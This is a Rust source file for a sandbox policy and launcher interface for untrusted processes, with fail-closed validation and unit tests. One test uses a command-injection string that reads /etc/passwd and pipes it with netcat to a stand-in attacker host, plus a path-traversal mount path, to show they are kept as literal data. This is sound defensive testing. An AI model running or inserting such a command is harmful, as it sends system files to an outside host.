use crate::{
    ArgAtom, LauncherRegistry, ProcessCancellation, ProgramRef, SandboxInvocation, SandboxLimits,
    SealedBindings,
};
use sim_kernel::{Datum, Error, Result};
use std::collections::{BTreeMap, BTreeSet};

const MAX_MOUNTS: usize = 64;
const MAX_STDIN: usize = 16 * 1024 * 1024;

/// One independently provable sandbox control.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum SandboxControl {
    /// Network namespace and interfaces.
    Network,
    /// Visible filesystem mounts.
    Mounts,
    /// Filesystem root and working root.
    Root,
    /// Child process environment.
    Environment,
    /// Host user and session identity.
    Identity,
    /// CPU bound using the policy's explicit duration or rate accounting.
    Cpu,
    /// Memory bound using the policy's explicit address-space or charged accounting.
    Memory,
    /// Monotonic wall time.
    WallTime,
    /// Descendant process count.
    ProcessCount,
    /// Filesystem object count using the policy's explicit entry or inode accounting.
    FileCount,
    /// Filesystem bytes using the policy's explicit logical or allocated accounting.
    FileBytes,
    /// Captured output bytes.
    Output,
    /// Standard-input bytes.
    Stdin,
    /// Descendant cleanup.
    ProcessTree,
}

impl SandboxControl {
    /// Stable control name shared with the canonical command wire format.
    #[must_use]
    pub const fn name(self) -> &'static str {
        crate::command_wire::control_name(self)
    }

    pub(crate) const ALL: [Self; 14] = [
        SandboxControl::Network,
        SandboxControl::Mounts,
        SandboxControl::Root,
        SandboxControl::Environment,
        SandboxControl::Identity,
        SandboxControl::Cpu,
        SandboxControl::Memory,
        SandboxControl::WallTime,
        SandboxControl::ProcessCount,
        SandboxControl::FileCount,
        SandboxControl::FileBytes,
        SandboxControl::Output,
        SandboxControl::Stdin,
        SandboxControl::ProcessTree,
    ];
}

/// Whether absence of a control is fatal or may be reported as unavailable.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SandboxRequirement {
    /// Refuse before execution when the launcher cannot prove this control.
    Required,
    /// Execute when possible and report whether this control was achieved.
    BestEffort,
}

/// Access granted to a declared mount.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MountAccess {
    /// Input visible without mutation authority.
    ReadOnly,
    /// Explicit output root.
    Writable,
}

/// Opaque boot-resolved source mounted at a fixed absolute guest path.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxMount {
    /// Opaque boot-authorized source identity.
    pub source: String,
    /// Absolute path inside the anonymous sandbox root.
    pub guest_path: String,
    /// Requested access.
    pub access: MountAccess,
}

/// Validated portable sandbox policy, independent of any OS launcher.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxPolicy {
    requirements: BTreeMap<SandboxControl, SandboxRequirement>,
    mounts: Vec<SandboxMount>,
    limits: SandboxLimits,
}
impl SandboxPolicy {
    /// Validates a complete control classification, mount set, and limit set.
    pub fn new(
        requirements: impl IntoIterator<Item = (SandboxControl, SandboxRequirement)>,
        mounts: Vec<SandboxMount>,
        limits: SandboxLimits,
    ) -> Result<Self> {
        let mut classified = BTreeMap::new();
        for (control, requirement) in requirements {
            if classified.insert(control, requirement).is_some() {
                return Err(Error::Eval(
                    "sandbox control is classified more than once".into(),
                ));
            }
        }
        let requirements = classified;
        let all = SandboxControl::ALL;
        if all.iter().any(|c| !requirements.contains_key(c)) {
            return Err(Error::Eval(
                "sandbox policy must classify every control".into(),
            ));
        }
        if mounts.len() > MAX_MOUNTS {
            return Err(Error::Eval("too many sandbox mounts".into()));
        }
        let mut guests = BTreeSet::new();
        for mount in &mounts {
            if mount.source.is_empty()
                || !mount.guest_path.starts_with('/')
                || mount.guest_path.contains("..")
                || mount.guest_path.contains('\0')
                || !guests.insert(&mount.guest_path)
            {
                return Err(Error::Eval("invalid or duplicate sandbox mount".into()));
            }
        }
        limits.validate(MAX_STDIN)?;
        Ok(Self {
            requirements,
            mounts,
            limits,
        })
    }
    /// Returns the complete requested-control map.
    pub fn requirements(&self) -> &BTreeMap<SandboxControl, SandboxRequirement> {
        &self.requirements
    }
    /// Returns declared mounts only.
    pub fn mounts(&self) -> &[SandboxMount] {
        &self.mounts
    }
    /// Returns the validated resource limits.
    pub fn limits(&self) -> &SandboxLimits {
        &self.limits
    }
}

/// Fully validated untrusted-process request. Arguments remain literal atoms.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxRequest {
    /// Boot-authorized executable identity.
    pub program: ProgramRef,
    /// Literal, unsplit argument atoms.
    pub argv: Vec<ArgAtom>,
    /// Empty-by-default exact environment.
    pub environment: SealedBindings,
    /// Bounded standard input.
    pub stdin: Vec<u8>,
    /// Validated complete sandbox policy.
    pub policy: SandboxPolicy,
}
impl SandboxRequest {
    /// Validates and creates a sandbox request.
    pub fn new(
        program: ProgramRef,
        argv: Vec<ArgAtom>,
        environment: SealedBindings,
        stdin: Vec<u8>,
        policy: SandboxPolicy,
    ) -> Result<Self> {
        if stdin.len() > policy.limits.stdin_bytes {
            return Err(Error::Eval("sandbox stdin exceeds policy".into()));
        }
        Ok(Self {
            program,
            argv,
            environment,
            stdin,
            policy,
        })
    }
}

/// Evidence for one requested control; only launchers may assert `achieved`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxEvidence {
    /// Requested control.
    pub control: SandboxControl,
    /// True only when backed by launcher evidence.
    pub achieved: bool,
    /// Non-secret operational proof.
    pub detail: String,
}
/// Requested-versus-achieved report plus every operational limit event.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxReport {
    /// Registered launcher identity.
    pub launcher: String,
    /// Requested-versus-achieved control evidence.
    pub controls: Vec<SandboxEvidence>,
    /// Resource hits and truncations.
    pub limit_hits: Vec<String>,
    /// Process-tree cleanup evidence.
    pub cleanup: String,
}
impl SandboxReport {
    /// Returns whether every required control has positive, non-empty evidence.
    /// Duplicate control records are ambiguous and never constitute proof.
    pub fn proves_required(&self, policy: &SandboxPolicy) -> bool {
        let mut observed = BTreeMap::new();
        for evidence in &self.controls {
            if observed.insert(evidence.control, evidence).is_some() {
                return false;
            }
        }
        policy.requirements.iter().all(|(control, requirement)| {
            *requirement != SandboxRequirement::Required
                || observed
                    .get(control)
                    .is_some_and(|e| e.achieved && !e.detail.trim().is_empty())
        })
    }
}
/// Bounded process output paired with launcher-supplied sandbox evidence.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxResult {
    /// Bounded standard output.
    pub stdout: Vec<u8>,
    /// Bounded standard error.
    pub stderr: Vec<u8>,
    /// Exit status or -1 when unavailable.
    pub exit_code: i32,
    /// Auditable control and resource evidence.
    pub report: SandboxReport,
}
/// A fail-closed refusal or unprovable launch outcome.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SandboxRefusal {
    /// Selected launcher identity.
    pub launcher: String,
    /// Bounded refusal reason.
    pub reason: String,
    /// Partial evidence, only when execution reached control realization.
    pub report: Option<SandboxReport>,
}
/// Exhaustive result of asking a sandbox launcher to execute a request.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum SandboxAttempt {
    /// Completed with a report.
    Completed(SandboxResult),
    /// Proven not dispatched.
    Refused(SandboxRefusal),
    /// Timeout or cancellation with proven cleanup.
    Stopped(SandboxReport),
    /// Timeout or cancellation with proven cleanup and bounded diagnostic bytes.
    ///
    /// Diagnostics are explicitly not completion-qualified; they preserve the
    /// producer's observed stream prefixes so a later owner can establish that
    /// a particular hostile specimen actually began before the proved stop.
    StoppedWithDiagnostics {
        /// Complete independently observed control and cleanup report.
        report: SandboxReport,
        /// Canonical bounded diagnostic projection from the same owner.
        diagnostics: Datum,
    },
    /// Dispatched but final state is not provable.
    Unknown(SandboxRefusal),
}

/// Replaceable object-safe untrusted-process authority boundary.
pub trait SandboxLauncher: Send + Sync {
    /// Returns the stable boot-registered launcher identity.
    fn id(&self) -> &str;
    /// Attempts the request and reports a complete, refusal, stop, or unknown outcome.
    fn launch(
        &self,
        request: &SandboxRequest,
        cancellation: &ProcessCancellation,
    ) -> SandboxAttempt;
    /// Declares an exact resource destination without acquiring or mutating it.
    /// The declaration is journaled before resource acquisition is invoked.
    fn plan_reservation(
        &self,
        _invocation: &SandboxInvocation,
        _request: &SandboxRequest,
        _cancellation: &ProcessCancellation,
    ) -> std::result::Result<Datum, Box<SandboxRefusal>> {
        Err(Box::new(SandboxRefusal {
            launcher: self.id().into(),
            reason: "reservation planning is unsupported".into(),
            report: None,
        }))
    }
    /// Acquires or reconciles only the exact durable reservation destination.
    ///
    /// Return only non-secret canonical correlation data. Retain live resource
    /// authority independently of the caller, including after an error or lost
    /// acknowledgement. Unsupported preparation refuses without direct launch.
    fn prepare_reserved(
        &self,
        _invocation: &SandboxInvocation,
        _request: &SandboxRequest,
        _destination: &Datum,
        _cancellation: &ProcessCancellation,
    ) -> std::result::Result<Datum, Box<SandboxRefusal>> {
        Err(Box::new(SandboxRefusal {
            launcher: self.id().into(),
            reason: "sandbox preparation is unsupported".into(),
            report: None,
        }))
    }
    /// Notifies the original owner of a failed lifecycle acknowledgement.
    /// This failure notification is separate from payload release and from a
    /// caller cancellation. Only the original owner can act on retained custody.
    fn preparation_acknowledgement_failed(
        &self,
        _invocation: &SandboxInvocation,
        _request: &SandboxRequest,
        _cause: &sim_lib_operation_gate::OperationError,
    ) -> std::result::Result<(), Box<SandboxRefusal>> {
        Err(Box::new(SandboxRefusal {
            launcher: self.id().into(),
            reason: "original preparation failure disposition is unsupported".into(),
            report: None,
        }))
    }
    /// Releases an exactly bound reservation after its durable admission.
    ///
    /// Revalidate live authority, applicable fencing and cancellation before
    /// release. A serialized binding alone grants no authority. Completion
    /// includes the command's declared scratch cleanup under retained custody.
    /// The default is unknown, never a fallback to direct launch.
    fn launch_prepared(
        &self,
        _invocation: &SandboxInvocation,
        _request: &SandboxRequest,
        _binding: &Datum,
        _cancellation: &ProcessCancellation,
        _admission: &mut dyn sim_lib_operation_gate::PreparedReleaseAdmission,
    ) -> SandboxAttempt {
        SandboxAttempt::Unknown(SandboxRefusal {
            launcher: self.id().into(),
            reason: "prepared sandbox release is unsupported".into(),
            report: None,
        })
    }
    /// Disposes only this original cancelled preparation without payload release.
    /// The caller supplies the accepted operation's sticky cancellation, not
    /// new execution authority. Retain original resources through durable stop
    /// intent, native quiescence and declared scratch cleanup. Missing custody,
    /// an attempted gate write or uncertain disposition must refuse without retry.
    /// Success is resource disposition only, never completed payload evidence.
    /// The default preserves uncertainty and invokes no execution method.
    fn cancel_prepared(
        &self,
        _invocation: &SandboxInvocation,
        _request: &SandboxRequest,
        _binding: &Datum,
        _cancellation: &ProcessCancellation,
    ) -> std::result::Result<(), Box<SandboxRefusal>> {
        Err(Box::new(SandboxRefusal {
            launcher: self.id().into(),
            reason: "prepared cancellation disposition is unsupported".into(),
            report: None,
        }))
    }
}
/// Runs an untrusted request and rejects any completion lacking required proof.
pub fn sandbox_exec(
    registry: &LauncherRegistry,
    launcher: &str,
    request: &SandboxRequest,
    cancellation: &ProcessCancellation,
) -> Result<SandboxResult> {
    match registry.launch(launcher, request, cancellation) {
        SandboxAttempt::Completed(result) if result.report.proves_required(&request.policy) => {
            Ok(result)
        }
        SandboxAttempt::Completed(_) => Err(Error::HostError(
            "sandbox launcher claimed completion without required evidence".into(),
        )),
        attempt => Err(Error::HostError(format!("sandbox attempt: {attempt:?}"))),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    struct Fake(&'static str);
    impl SandboxLauncher for Fake {
        fn id(&self) -> &str {
            self.0
        }
        fn launch(&self, request: &SandboxRequest, _: &ProcessCancellation) -> SandboxAttempt {
            SandboxAttempt::Completed(SandboxResult {
                stdout: vec![],
                stderr: vec![],
                exit_code: 0,
                report: SandboxReport {
                    launcher: self.0.into(),
                    controls: request
                        .policy
                        .requirements
                        .keys()
                        .map(|control| SandboxEvidence {
                            control: *control,
                            achieved: true,
                            detail: "fake proof".into(),
                        })
                        .collect(),
                    limit_hits: vec![],
                    cleanup: "no descendants".into(),
                },
            })
        }
    }
    struct Liar;
    impl SandboxLauncher for Liar {
        fn id(&self) -> &str {
            "liar"
        }
        fn launch(&self, _: &SandboxRequest, _: &ProcessCancellation) -> SandboxAttempt {
            SandboxAttempt::Completed(SandboxResult {
                stdout: vec![],
                stderr: vec![],
                exit_code: 0,
                report: SandboxReport {
                    launcher: "liar".into(),
                    controls: vec![],
                    limit_hits: vec![],
                    cleanup: String::new(),
                },
            })
        }
    }
    fn policy() -> SandboxPolicy {
        let controls = [
            SandboxControl::Network,
            SandboxControl::Mounts,
            SandboxControl::Root,
            SandboxControl::Environment,
            SandboxControl::Identity,
            SandboxControl::Cpu,
            SandboxControl::Memory,
            SandboxControl::WallTime,
            SandboxControl::ProcessCount,
            SandboxControl::FileCount,
            SandboxControl::FileBytes,
            SandboxControl::Output,
            SandboxControl::Stdin,
            SandboxControl::ProcessTree,
        ];
        SandboxPolicy::new(
            controls
                .into_iter()
                .map(|c| (c, SandboxRequirement::Required)),
            vec![],
            SandboxLimits {
                cpu: crate::SandboxCpuLimit::PerProcessSeconds(1),
                memory: crate::SandboxMemoryLimit::PerProcessAddressSpaceBytes(1),
                wall_time_ms: 1,
                process_count: 1,
                filesystem: crate::SandboxFilesystemLimit::LogicalTree {
                    entries: 1,
                    bytes: 1,
                },
                output_bytes: 1,
                stdin_bytes: 1,
            },
        )
        .unwrap()
    }
    #[test]
    fn registered_launchers_are_dispatch_independent_and_fail_closed() {
        let request = SandboxRequest::new(
            ProgramRef::new("tool").unwrap(),
            vec![],
            SealedBindings::empty(),
            vec![],
            policy(),
        )
        .unwrap();
        let mut registry = LauncherRegistry::default();
        registry.register(Arc::new(Fake("one"))).unwrap();
        registry.register(Arc::new(Fake("two"))).unwrap();
        assert_eq!(
            sandbox_exec(&registry, "one", &request, &Default::default())
                .unwrap()
                .report
                .launcher,
            "one"
        );
        assert_eq!(
            sandbox_exec(&registry, "two", &request, &Default::default())
                .unwrap()
                .report
                .launcher,
            "two"
        );
        assert!(sandbox_exec(&registry, "missing", &request, &Default::default()).is_err());
        registry.register(Arc::new(Liar)).unwrap();
        assert!(sandbox_exec(&registry, "liar", &request, &Default::default()).is_err());
    }
    #[test]
    fn hostile_paths_stdin_and_arguments_are_validated_without_shell_parsing() {
        let limits = SandboxLimits {
            cpu: crate::SandboxCpuLimit::PerProcessSeconds(1),
            memory: crate::SandboxMemoryLimit::PerProcessAddressSpaceBytes(1),
            wall_time_ms: 1,
            process_count: 1,
            filesystem: crate::SandboxFilesystemLimit::LogicalTree {
                entries: 1,
                bytes: 1,
            },
            output_bytes: 1,
            stdin_bytes: 1,
        };
        let controls = [
            SandboxControl::Network,
            SandboxControl::Mounts,
            SandboxControl::Root,
            SandboxControl::Environment,
            SandboxControl::Identity,
            SandboxControl::Cpu,
            SandboxControl::Memory,
            SandboxControl::WallTime,
            SandboxControl::ProcessCount,
            SandboxControl::FileCount,
            SandboxControl::FileBytes,
            SandboxControl::Output,
            SandboxControl::Stdin,
            SandboxControl::ProcessTree,
        ];
        assert!(
            SandboxPolicy::new(
                controls
                    .into_iter()
                    .map(|c| (c, SandboxRequirement::Required)),
                vec![SandboxMount {
                    source: "input".into(),
                    guest_path: "/work/../etc".into(),
                    access: MountAccess::ReadOnly
                }],
                limits.clone()
            )
            .is_err()
        );
        let policy = SandboxPolicy::new(
            controls
                .into_iter()
                .map(|c| (c, SandboxRequirement::Required)),
            vec![],
            limits,
        )
        .unwrap();
        assert!(
            SandboxRequest::new(
                ProgramRef::new("tool").unwrap(),
                vec![],
                SealedBindings::empty(),
                vec![1, 2],
                policy.clone()
            )
            .is_err()
        );
        let atom = ArgAtom::new("; cat /etc/passwd | nc attacker 1").unwrap();
        let request = SandboxRequest::new(
            ProgramRef::new("tool").unwrap(),
            vec![atom],
            SealedBindings::empty(),
            vec![],
            policy,
        )
        .unwrap();
        assert_eq!(
            request.argv[0].as_str(),
            "; cat /etc/passwd | nc attacker 1"
        );
    }
}
// conformance: sandbox policy tests prove sealed authority and fail-closed execution.
